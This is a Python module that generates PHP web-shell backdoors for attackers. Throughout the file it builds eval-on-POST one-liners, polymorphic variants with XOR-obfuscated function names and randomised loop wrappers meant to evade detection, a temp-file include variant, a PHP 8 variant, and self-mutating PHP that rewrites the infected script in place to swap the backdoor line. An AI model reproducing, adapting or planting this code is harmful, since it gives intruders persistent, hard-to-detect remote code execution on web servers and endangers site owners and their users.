"""Payload generation: classic one-liner, polymorphic (bypass), mutation PHP."""

from __future__ import annotations

import base64
import random
import secrets


def _var_name() -> str:
    x = secrets.token_hex(2)
    while x and x[0].isdigit():
        x = secrets.token_hex(2)
    return x or "x"


def _obfuscate_create_function(sep: str, many: int) -> str:
    text = "create_function"
    return sep.join(text[i : i + many] for i in range(0, len(text), many))


def generate_backdoor(mode: str, Zc: str, Vc: str) -> list[str]:
    """
    Generate payload(s) for given send mode and param names.
    Returns list of strings (classic, tmp-include, function bypass, mutated, etc.).
    """
    if mode == "simple":
        return [
            f"if(isset($_POST['{Zc}'])){{@eval($_POST['{Zc}']);die();}}",
        ]

    if mode == "classic":
        return [
            f"if(isset($_POST['{Zc}'])){{@eval(base64_decode(str_replace($_POST['{Vc}'],'',$_POST['{Zc}'])));die();}}",
        ]

    # bypass: polymorphic create_function + base64
    x = _var_name()
    chars = secrets.token_urlsafe(2)
    many = random.randint(1, 3)
    list_one = _obfuscate_create_function(chars, many)

    structure = random.randint(1, 4)
    if structure == 1:
        start = f"if(isset($_POST['{Zc}'])){{"
        end2 = "}"
    elif structure == 2:
        start = "do{"
        end2 = f"break;}}while(isset($_POST['{Zc}']));"
    elif structure == 3:
        start = f"while(isset($_POST['{Zc}'])){{"
        end2 = "break;}"
    else:
        start = f"for(isset($_POST['{Zc}']);;){{"
        end2 = "break;}"

    first = random.randint(1, 6)
    if first == 1:
        str1 = f"${x} = str_replace('{chars}','','{list_one}')"
    elif first == 2:
        str1 = f"${x} = (\"jRp4RiOHgeG\"^\"cglYOHetARC\"^\"zAn2oDZPGTa\")('{chars}','','{list_one}')"
    elif first == 3:
        str1 = f"${x} = strtr(\"{list_one}\", array(\"{chars}\" =>\"\"))"
    elif first == 4:
        str1 = f"${x} = (\"3NBQA\"^\"7xsKi\"^\"wBCnZ\")(\"{list_one}\", array(\"{chars}\" =>\"\"))"
    elif first == 5:
        str1 = f"${x} = preg_replace(\"/{chars}/\",\"\",\"{list_one}\")"
    else:
        str1 = f"${x} = (\"HeAcQfTChEyS\"^\"roGfIBCkNHxy\"^\"JxcbGVrXJlbO\")(\"/{chars}/\",\"\",\"{list_one}\")"

    basesf = random.randint(1, 2)
    if basesf == 1:
        b64 = "('',base64_decode"
    else:
        b64 = "('',(\"wBnttPJWhudVy\"^\"OATvw1TwONBxp\"^\"ZbIg5UADBXIJl\")"

    second = random.randint(1, 4)
    if second == 1:
        str2 = f"(str_replace($_POST['{Vc}'],'',$_POST['{Zc}'])));"
    elif second == 2:
        str2 = f"((\"jRp4RiOHgeG\"^\"cglYOHetARC\"^\"zAn2oDZPGTa\")($_POST['{Vc}'],'',$_POST['{Zc}'])));"
    elif second == 3:
        str2 = f"(strtr($_POST['{Zc}'], array($_POST['{Vc}'] => ''))));"
    else:
        str2 = f"((\"3NBQA\"^\"7xsKi\"^\"wBCnZ\")($_POST['{Zc}'], array($_POST['{Vc}'] => '')));"

    end = f"${x}();die();"
    full = start + str1 + b64 + str2 + end + end2

    classic = f"if(isset($_POST['{Zc}'])){{@eval(base64_decode(str_replace($_POST['{Vc}'],'',$_POST['{Zc}'])));die();}}"
    tmp = f"if(isset($_POST['{Zc}'])){{$f=tempnam(sys_get_temp_dir(),'');file_put_contents($f,\"<?php \\n\".base64_decode(str_replace($_POST['{Vc}'],'',$_POST['{Zc}'])).\"\\n ?>\");include_once($f);unlink($f);die();}}"
    return [classic, f"TMP-include:\n{tmp}", f"Function bypass (PHP < 8 only):\n{full}"]


def generate_polymorphic_backdoor(Zt: str, Vt: str) -> str:
    """Generate a single polymorphic backdoor with new param names Zt, Vt (for mutate)."""
    x = _var_name()
    chars = secrets.token_urlsafe(2)
    many = random.randint(1, 3)
    list_one = _obfuscate_create_function(chars, many)

    structure = random.randint(1, 4)
    if structure == 1:
        start = f"if(isset($_POST['{Zt}'])){{"
        end2 = "}"
    elif structure == 2:
        start = "do{"
        end2 = f"break;}}while(isset($_POST['{Zt}']));"
    elif structure == 3:
        start = f"while(isset($_POST['{Zt}'])){{"
        end2 = "break;}"
    else:
        start = f"for(isset($_POST['{Zt}']);;){{"
        end2 = "break;}"

    first = random.randint(1, 6)
    if first == 1:
        str1 = f"${x} = str_replace('{chars}','','{list_one}')"
    elif first == 2:
        str1 = f"${x} = (\"jRp4RiOHgeG\"^\"cglYOHetARC\"^\"zAn2oDZPGTa\")('{chars}','','{list_one}')"
    elif first == 3:
        str1 = f"${x} = strtr(\"{list_one}\", array(\"{chars}\" =>\"\"))"
    elif first == 4:
        str1 = f"${x} = (\"3NBQA\"^\"7xsKi\"^\"wBCnZ\")(\"{list_one}\", array(\"{chars}\" =>\"\"))"
    elif first == 5:
        str1 = f"${x} = preg_replace(\"/{chars}/\",\"\",\"{list_one}\")"
    else:
        str1 = f"${x} = (\"HeAcQfTChEyS\"^\"roGfIBCkNHxy\"^\"JxcbGVrXJlbO\")(\"/{chars}/\",\"\",\"{list_one}\")"

    basesf = random.randint(1, 2)
    if basesf == 1:
        b64 = "('',base64_decode"
    else:
        b64 = "('',(\"wBnttPJWhudVy\"^\"OATvw1TwONBxp\"^\"ZbIg5UADBXIJl\")"

    second = random.randint(1, 4)
    if second == 1:
        str2 = f"(str_replace($_POST['{Vt}'],'',$_POST['{Zt}'])));"
    elif second == 2:
        str2 = f"((\"jRp4RiOHgeG\"^\"cglYOHetARC\"^\"zAn2oDZPGTa\")($_POST['{Vt}'],'',$_POST['{Zt}'])));"
    elif second == 3:
        str2 = f"(strtr($_POST['{Zt}'], array($_POST['{Vt}'] => ''))));"
    else:
        str2 = f"((\"3NBQA\"^\"7xsKi\"^\"wBCnZ\")($_POST['{Zt}'], array($_POST['{Vt}'] => '')));"

    end = f"${x}();die();"
    return start + str1 + b64 + str2 + end + end2


def generate_php8_backdoor(Zt: str, Vt: str) -> str:
    """
    Generate backdoor for PHP 8+: no create_function, eval() stays literal.
    Mutates: wrapper (if/do/while/for), assemble (str_replace/strtr, plain or XOR),
    base64_decode (plain or XOR). Same protocol (POST Z, V).
    """
    structure = random.randint(1, 4)
    if structure == 1:
        start = f"if(isset($_POST['{Zt}'])){{"
        end2 = "}"
    elif structure == 2:
        # do { if(!isset) break; body } while(0) - body only when POST set
        start = f"do{{if(!isset($_POST['{Zt}']))break;"
        end2 = "}while(0);"
    elif structure == 3:
        start = f"while(isset($_POST['{Zt}'])){{"
        end2 = "break;}"
    else:
        # for(;isset();) { body break; } - body only when POST set
        start = f"for(;isset($_POST['{Zt}']);){{"
        end2 = "break;}"

    # Assemble: remove separator from POST[Zt] (str_replace or strtr, plain or XOR)
    assemble_choice = random.randint(1, 4)
    if assemble_choice == 1:
        inner = f"str_replace($_POST['{Vt}'],'',$_POST['{Zt}'])"
    elif assemble_choice == 2:
        inner = f"(\"jRp4RiOHgeG\"^\"cglYOHetARC\"^\"zAn2oDZPGTa\")($_POST['{Vt}'],'',$_POST['{Zt}'])"
    elif assemble_choice == 3:
        inner = f"strtr($_POST['{Zt}'], array($_POST['{Vt}']=>''))"
    else:
        inner = f"(\"3NBQA\"^\"7xsKi\"^\"wBCnZ\")($_POST['{Zt}'], array($_POST['{Vt}']=>''))"

    # base64_decode: plain or XOR
    if random.randint(1, 2) == 1:
        b64_call = f"base64_decode({inner})"
    else:
        b64_call = f"(\"wBnttPJWhudVy\"^\"OATvw1TwONBxp\"^\"ZbIg5UADBXIJl\")({inner})"

    body = f"@eval({b64_call});die();"
    return start + body + end2


def mutation_php(new_backdoor_php: str, current_Z: str) -> str:
    """
    Return PHP code that: reads current script file, finds line containing
    isset($_POST['current_Z']), replaces it with new_backdoor_php, writes file back.
    """
    b64_backdoor = base64.b64encode(new_backdoor_php.encode("utf-8")).decode("ascii")
    findme = f"isset($_POST['{current_Z}'])"
    findme_php = findme.replace("\\", "\\\\").replace("'", "\\'")
    return f"""$what = base64_decode('{b64_backdoor}');
$findme = '{findme_php}';
$n = $_SERVER['SCRIPT_FILENAME'];
$text = file_get_contents($n);
if($text === false){{echo "ERR:cannot read file";return;}}
$array = explode("\\n", $text);
$found = false;
for ($i = 0, $dot = count($array); $i < $dot; $i++) {{
    if (strpos($array[$i], $findme) !== false) {{
        $array[$i] = $what;
        $found = true;
        echo "Found at line ".$i."\\n";
        break;
    }}
}}
if(!$found){{echo "ERR:marker line not found";return;}}
echo "Mutating...\\n";
if(file_put_contents($n, implode("\\n", $array)) === false){{echo "ERR:write failed";return;}}
if(function_exists('opcache_invalidate')){{opcache_invalidate($n, true);}}
echo "Mutated successfully";
"""
